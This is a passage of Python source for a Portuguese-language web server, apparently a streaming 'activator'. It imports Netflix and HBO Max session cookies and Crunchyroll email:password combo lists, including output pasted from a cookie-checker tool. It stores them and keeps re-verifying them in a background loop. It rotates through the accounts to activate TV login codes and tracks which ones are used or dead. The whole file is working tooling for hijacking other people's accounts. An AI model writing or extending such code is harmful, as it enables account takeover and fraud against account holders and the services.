                }, 404)

            used_account = CURRENT_CRUNCHYROLL_READY
            success, msg, info = activate_crunchyroll_tv(clean_code, used_account)
            account_info = info or used_account.get("info", {})

            if success:
                USED_CRUNCHYROLL_ACCOUNTS.add(used_account["email"])
                record_history_entry("Crunchyroll", used_account.get("file", "combo.txt"), account_info.get("email", ""), clean_code, account_info.get("plan", "Crunchyroll VIP"), "Sucesso")
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
                return self.send_json_response({
                    "success": True,
                    "message": msg,
                    "account": account_info
                })
            else:
                if "sessão" in msg.lower() or "token" in msg.lower():
                    DEAD_CRUNCHYROLL_ACCOUNTS.add(used_account["email"])
                    CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
                return self.send_json_response({
                    "success": False,
                    "message": msg
                })
        else:
            return self.send_json_response({"success": False, "message": "Serviço desconhecido."}, 400)

    def handle_api_cookies(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
        query_service = 'netflix'
        if 'service=hbo' in self.path:
            query_service = 'hbo'
        elif 'service=crunchyroll' in self.path:
            query_service = 'crunchyroll'

        if not self.is_service_allowed(query_service):
            return self.send_json_response({
                "service": query_service,
                "total_valid": 0,
                "active_cookie": "",
                "cookies": [],
                "blocked": True,
                "message": "🔒 Você não tem acesso a esse conteúdo."
            })

        if query_service == 'netflix':
            all_accounts = get_all_netflix_accounts()
            active_file = os.path.basename(CURRENT_NETFLIX_READY["file"]) if CURRENT_NETFLIX_READY else ""
            items = []
            for entry in all_accounts:
                bname = os.path.basename(entry["file"])
                acc = entry["info"]
                items.append({
                    "filename": bname,
                    "email": acc.get("email", bname),
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Premium VIP"),
                    "is_selected": (bname == active_file),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
        elif query_service == 'crunchyroll':
            all_accounts = get_all_crunchyroll_accounts()
            active_email = CURRENT_CRUNCHYROLL_READY["email"] if CURRENT_CRUNCHYROLL_READY else ""
            items = []
            for entry in all_accounts:
                email = entry["info"].get("email", entry.get("file", ""))
                acc = entry["info"]
                items.append({
                    "filename": email,
                    "email": email,
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "Crunchyroll VIP"),
                    "is_selected": (email == active_email),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])
        else:
            all_accounts = get_all_hbo_accounts()
            active_file = os.path.basename(CURRENT_HBO_READY["file"]) if CURRENT_HBO_READY else ""
            items = []
            for entry in all_accounts:
                bname = os.path.basename(entry["file"])
                acc = entry["info"]
                items.append({
                    "filename": bname,
                    "email": acc.get("email", bname),
                    "country": acc.get("country", "BR"),
                    "plan": acc.get("plan", "HBO Max VIP"),
                    "is_selected": (bname == active_file),
                    "is_verified": entry.get("validated", False),
                    "is_dead": False
                })
            items.sort(key=lambda x: not x["is_selected"])

        self.send_json_response({
            "service": query_service,
            "total_valid": len(items),
            "active_cookie": active_email if query_service == 'crunchyroll' else active_file,
            "cookies": items
        })

    def handle_api_select_cookie(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        req = json.loads(post_data.decode('utf-8')) if post_data else {}
        service = req.get('service', 'netflix')
        filename = req.get('filename', '').strip()

        if not filename:
            return self.send_json_response({"success": False, "message": "Nome do arquivo ausente."}, 400)

        if not self.is_service_allowed(service):
            return self.send_json_response({"success": False, "message": "🔒 Você não tem acesso a esse conteúdo."}, 403)

        if service == 'netflix':
            selected = select_netflix_cookie_by_filename(filename)
            if selected:
                CURRENT_NETFLIX_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": os.path.basename(selected["file"])
                })
            else:
                return self.send_json_response({"success": False, "message": "Este cookie não está mais ativo na Netflix."}, 404)
        elif service == 'crunchyroll':
            selected = select_crunchyroll_account_by_identifier(filename)
            if selected:
                CURRENT_CRUNCHYROLL_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta Crunchyroll {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": selected.get("email", filename)
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível ativar esta conta Crunchyroll."}, 404)
        else:
            selected = select_hbo_cookie_by_filename(filename)
            if selected:
                CURRENT_HBO_READY = selected
                return self.send_json_response({
                    "success": True,
                    "message": f"Conta HBO {selected['info'].get('email', filename)} selecionada!",
                    "account": selected["info"],
                    "cookie_name": os.path.basename(selected["file"])
                })
            else:
                return self.send_json_response({"success": False, "message": "Não foi possível ativar este cookie HBO Max."}, 404)

    def handle_api_filter_plan(self):
        return self.send_json_response({"success": True, "message": "Plano atualizado."})

    def handle_api_history(self):
        history = load_history()
        self.send_json_response({"history": history})

    def handle_api_upload_cookies(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length)
        try:
            req = json.loads(post_data.decode('utf-8'))
        except Exception:
            return self.send_json_response({"success": False, "message": "JSON inválido."}, 400)

        global_service = req.get('service', 'auto').lower()
        files = req.get('files', [])  # list of {"name": "...", "content": "..."}
        raw_text = req.get('raw_text', '').strip()

        saved_netflix = 0
        saved_hbo = 0
        saved_crunchyroll = 0

        def detect_service_for_text(text: str, filename: str = "") -> str:
            lower = (text + " " + filename).lower()
            if 'crunchyroll' in lower or 'crunchy' in lower:
                return 'crunchyroll'
            if global_service in ['crunchyroll', 'cr']:
                return 'crunchyroll'
            if ('@' in text and (':' in text or '|' in text)) and ('securentflxid' not in lower and 'max.com' not in lower and 'st=' not in lower and 'netflix' not in lower):
                return 'crunchyroll'
            if 'securentflxid' in lower or 'netflix' in lower:
                return 'netflix'
            elif 'max.com' in lower or 'hbomax' in lower or 'beam' in lower or 'hbo' in lower:
                return 'hbomax'
            if global_service in ['hbo', 'hbomax', 'max']:
                return 'hbomax'
            return 'netflix'

        def save_cookie_content(svc: str, fname: str, content: str, append_mode: bool = False) -> bool:
            nonlocal saved_netflix, saved_hbo, saved_crunchyroll
            if svc == 'crunchyroll':
                target_dir = CRUNCHYROLL_COMBO_FOLDER
            elif svc in ['hbo', 'hbomax', 'max']:
                target_dir = HBO_COOKIES_FOLDER
            else:
                target_dir = NETFLIX_COOKIES_FOLDER
            os.makedirs(target_dir, exist_ok=True)
            clean_name = re.sub(r'[^a-zA-Z0-9_\-\.\[\]@]', '_', os.path.basename(fname))
            if not clean_name.endswith('.txt') and not clean_name.endswith('.json'):
                clean_name += '.txt'
            fpath = os.path.join(target_dir, clean_name)
            try:
                mode = 'a' if (append_mode and os.path.exists(fpath)) else 'w'
                with open(fpath, mode, encoding='utf-8') as out_f:
                    if mode == 'a':
                        out_f.write('\n' + content.strip() + '\n')
                    else:
                        out_f.write(content)
                if svc == 'crunchyroll':
                    c_lines = [l for l in content.splitlines() if (':' in l or '|' in l) and '@' in l]
                    saved_crunchyroll += max(1, len(c_lines))
                    DEAD_CRUNCHYROLL_ACCOUNTS.clear()
                    USED_CRUNCHYROLL_ACCOUNTS.clear()
                elif svc in ['hbo', 'hbomax', 'max']:
                    saved_hbo += 1
                    USED_HBO_COOKIES.discard(fpath)
                    USED_HBO_COOKIES.discard(clean_name)
                else:
                    saved_netflix += 1
                    DEAD_NETFLIX_COOKIES.discard(fpath)
                    tv2.USED_COOKIES.discard(fpath)
                    tv2.USED_COOKIES.discard(clean_name)
                return True
            except Exception:
                return False

        def split_multiple_raw_cookies(text: str) -> List[str]:
            """Divide de forma inteligente lotes colados de cookies ou combos em itens separados sem corrompê-los."""
            text = text.strip()
            if not text:
                return []

            # 1. Se for lista de combos (Crunchyroll: email:senha linha a linha)
            lines = [line.strip() for line in text.splitlines() if line.strip()]
            combo_lines = [l for l in lines if re.match(r'^[a-zA-Z0-9_.+-]+@[a-zA-Z0-9-]+\.[a-zA-Z0-9-.]+[:|][^\s]+', l)]
            if len(combo_lines) >= 1 and len(combo_lines) == len(lines):
                # Formato padrão de lista de combos: preserva todas as contas em um arquivo único organizado
                return [text]

            # 2. Se contiver múltiplos blocos do formato padrão de checadores (ex: NETFLIX COOKIE CHECKER — HIT)
            checker_pattern = re.compile(r'(?:^|\r?\n)(?=[=]{10,}\s*\r?\n\s*NETFLIX COOKIE CHECKER)', re.MULTILINE)
            checker_parts = [p.strip() for p in checker_pattern.split(text) if p.strip()]
            if len(checker_parts) > 1:
                valid_hits = [p for p in checker_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'Email:', '📧'])]
                if valid_hits:
                    return valid_hits

            # 3. Se contiver múltiplos cookies Netscape com SecureNetflixId ou NetflixId
            netscape_pattern = re.compile(r'(?:^|\r?\n)(?=(?:\.netflix\.com|netflix\.com)\t[^\r\n]*\t(?:SecureNetflixId|NetflixId)\t)', re.MULTILINE)
            netscape_parts = [p.strip() for p in netscape_pattern.split(text) if p.strip()]
            if len(netscape_parts) > 1:
                return netscape_parts

            # 4. Se contiver múltiplos tokens HBO Max (st=eyJ...)
            st_matches = list(re.finditer(r'(?:st=)(eyJ[a-zA-Z0-9_\-\.]+)', text))
            if len(st_matches) > 1:
                return [f"st={m.group(1)}" for m in st_matches]

            # 5. Se contiver delimitadores explícitos de lotes (ex: 5 ou mais '=', '-', ou '#') onde cada bloco tem cookie
            delim_pattern = re.compile(r'\r?\n\s*[-=#]{5,}\s*\r?\n')
            delim_parts = [p.strip() for p in delim_pattern.split(text) if p.strip()]
            valid_delim = [p for p in delim_parts if any(k in p for k in ['NetflixId', 'SecureNetflixId', 'st=', '@'])]
            if len(valid_delim) > 1:
                return valid_delim

            return [text]

        # 0. Suporte direto a conta única Crunchyroll via JSON { "email": "...", "password": "..." }
        single_email = req.get('email', '').strip()
        single_pwd = req.get('password', '').strip() or req.get('pwd', '').strip()
        if single_email and single_pwd and ('@' in single_email):
            save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', f"{single_email}:{single_pwd}", append_mode=True)

        # 1. Processa múltiplos arquivos (da pasta inteira arrastada ou selecionada)
        for idx, item in enumerate(files):
            fname = item.get('name', '').strip() or f"cookie_{idx + 1}.txt"
            content = item.get('content', '').strip()
            if not content:
                continue

            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(content, fname)
            save_cookie_content(svc, fname, content)

        # 2. Processa texto bruto (pode conter 1 cookie, lote de cookies ou lista de contas Crunchyroll email:senha)
        if raw_text:
            timestamp = int(time.time())
            svc = global_service if global_service not in ['auto', ''] else detect_service_for_text(raw_text, "")

            # Se for explicitamente contas Crunchyroll (ou formato de combo email:senha)
            if svc == 'crunchyroll' or ((':' in raw_text or '|' in raw_text) and '@' in raw_text and 'netflix' not in raw_text.lower() and 'securentflxid' not in raw_text.lower()):
                save_cookie_content('crunchyroll', 'contas_crunchyroll.txt', raw_text, append_mode=True)
            else:
                is_json = raw_text.startswith('[') or raw_text.startswith('{')
                if is_json:
                    try:
                        parsed_json = json.loads(raw_text)
                        if isinstance(parsed_json, list) and parsed_json and isinstance(parsed_json[0], dict) and 'name' in parsed_json[0]:
                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
                        elif isinstance(parsed_json, list) and parsed_json and (isinstance(parsed_json[0], list) or isinstance(parsed_json[0], dict)):
                            for sub_idx, sub_item in enumerate(parsed_json):
                                sub_content = json.dumps(sub_item, indent=2)
                                save_cookie_content(svc, f"import_batch_{timestamp}_{sub_idx + 1}.json", sub_content)
                        else:
                            save_cookie_content(svc, f"import_json_{timestamp}.json", raw_text)
                    except Exception:
                        save_cookie_content(svc, f"import_raw_{timestamp}.txt", raw_text)
                else:
                    raw_chunks = split_multiple_raw_cookies(raw_text)
                    for b_idx, chunk in enumerate(raw_chunks):
                        chunk = chunk.strip()
                        if chunk:
                            save_cookie_content(svc, f"batch_cookie_{timestamp}_{b_idx + 1}.txt", chunk)

        total_saved = saved_netflix + saved_hbo + saved_crunchyroll
        if total_saved > 0:
            global SERVER_DATA_VERSION
            SERVER_DATA_VERSION = time.time()
            sync_cookies_bundle()
            COOKIE_FAIL_COUNTS.clear()
            
            # Limpa caches em memória para recarregar o novo estoque instantaneamente
            with VALID_NETFLIX_LOCK:
                VALID_NETFLIX_BY_FILE.clear()
                VALID_NETFLIX_POOL.clear()
            with VALID_HBO_LOCK:
                VALID_HBO_BY_FILE.clear()
                VALID_HBO_POOL.clear()
            with VALID_CRUNCHYROLL_LOCK:
                VALID_CRUNCHYROLL_BY_EMAIL.clear()
                VALID_CRUNCHYROLL_POOL.clear()

            if saved_netflix:
                CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
            elif saved_crunchyroll:
                CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
            else:
                CURRENT_HBO_READY = find_hbo_valid_cookie()

            return self.send_json_response({
                "success": True,
                "saved_count": total_saved,
                "saved_netflix": saved_netflix,
                "saved_hbo": saved_hbo,
                "saved_crunchyroll": saved_crunchyroll,
                "server_version": SERVER_DATA_VERSION,
                "message": f"🎉 {total_saved} conta(s)/cookie(s) importado(s) com sucesso! ({saved_netflix} Netflix, {saved_hbo} HBO Max, {saved_crunchyroll} Crunchyroll)"
            })
        else:
            return self.send_json_response({"success": False, "message": "Nenhum arquivo ou texto válido enviado."}, 400)

    def _prewarm_after_upload(self, service: str):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY
        time.sleep(0.3)
        if service == 'netflix':
            CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        elif service == 'crunchyroll':
            CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        else:
            CURRENT_HBO_READY = find_hbo_valid_cookie()

    def handle_api_reset_cache(self):
        global CURRENT_NETFLIX_READY, CURRENT_HBO_READY, CURRENT_CRUNCHYROLL_READY, DEAD_NETFLIX_COOKIES, USED_NETFLIX_COOKIES, USED_HBO_COOKIES, DEAD_CRUNCHYROLL_ACCOUNTS, USED_CRUNCHYROLL_ACCOUNTS, SERVER_DATA_VERSION
        DEAD_NETFLIX_COOKIES.clear()
        COOKIE_FAIL_COUNTS.clear()
        tv2.USED_COOKIES.clear()
        USED_HBO_COOKIES.clear()
        DEAD_CRUNCHYROLL_ACCOUNTS.clear()
        USED_CRUNCHYROLL_ACCOUNTS.clear()
        SERVER_DATA_VERSION = time.time()
        CURRENT_NETFLIX_READY = find_netflix_fast_cookie()
        CURRENT_HBO_READY = find_hbo_valid_cookie()
        CURRENT_CRUNCHYROLL_READY = find_crunchyroll_valid_account()
        return self.send_json_response({
            "success": True,
            "server_version": SERVER_DATA_VERSION,
            "message": "Cache de cookies e combos reinicializado! Todas as contas estão disponíveis para re-teste."
        })

    def handle_api_admin_stats(self):
        all_nf = get_all_netflix_accounts()
        all_hbo = get_all_hbo_accounts()
        all_cr = get_all_crunchyroll_accounts()
        verified_nf = [a for a in all_nf if a.get("validated")]
        verified_hbo = [a for a in all_hbo if a.get("validated")]
        verified_cr = [a for a in all_cr if a.get("validated")]
        return self.send_json_response({
            "netflix_total": len(all_nf),
            "netflix_verified": len(verified_nf),
            "netflix_dead": len(DEAD_NETFLIX_COOKIES),
            "hbo_total": len(all_hbo),
            "hbo_verified": len(verified_hbo),
            "hbo_dead": len(USED_HBO_COOKIES),
            "crunchyroll_total": len(all_cr),
            "crunchyroll_verified": len(verified_cr),
            "crunchyroll_dead": len(DEAD_CRUNCHYROLL_ACCOUNTS),
            "keep_alive": True,
            "timestamp": time.time()
        })


def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
    daemon_threads = True
    allow_reuse_address = True

def background_verifier_loop():
    while True:
        try:
            get_verified_netflix_cookies(min_count=8)
            get_verified_hbo_cookies(min_count=4)
            get_verified_crunchyroll_accounts(min_count=2)
        except Exception:
            pass
        time.sleep(12)

def keep_alive_worker():
    """Anti-Sleep 24h: Mantém a instância do Render 100% acordada e instantânea."""
    time.sleep(15) # Espera o servidor iniciar
    while True:
        try:
            # 1. Ping interno local
            requests.get(f"http://127.0.0.1:{PORT}/api/ping", timeout=4)
        except Exception:
            pass

        try:
            # 2. Ping externo se estiver na nuvem Render
            render_url = os.environ.get("RENDER_EXTERNAL_URL", "https://tvcodigo-1.onrender.com")
            if render_url:
                target = f"{render_url.rstrip('/')}/api/ping"
                requests.get(target, timeout=8)
        except Exception:
            pass

        time.sleep(300) # Ping a cada 5 minutos

def start_background_scanner():
    t1 = threading.Thread(target=background_verifier_loop, daemon=True)
    t1.start()
    t2 = threading.Thread(target=keep_alive_worker, daemon=True)
    t2.start()

def run_server(port=PORT):
    os.chdir(BASE_DIR)
    local_ip = get_local_ip()
    start_background_scanner()
    with ThreadedTCPServer(("", port), AppRequestHandler) as httpd:
        print(f"\n=======================================================")
        print(f" 🚀 ATIVADOR NETFLIX, HBO MAX & CRUNCHYROLL INICIADO COM SUCESSO!")
        print(f" ⚡ Anti-Sleep 24h: ATIVADO (Render sempre acordado)")
        print(f" 💻 Acesse no PC:      http://localhost:{port}")
        print(f" 📱 Acesse no Celular: http://{local_ip}:{port}  (no mesmo Wi-Fi)")
        print(f"=======================================================\n")
        try:
            httpd.serve_forever()
        except KeyboardInterrupt:
            print("\nServidor finalizado pelo usuário.")

if __name__ == "__main__":
    run_server()
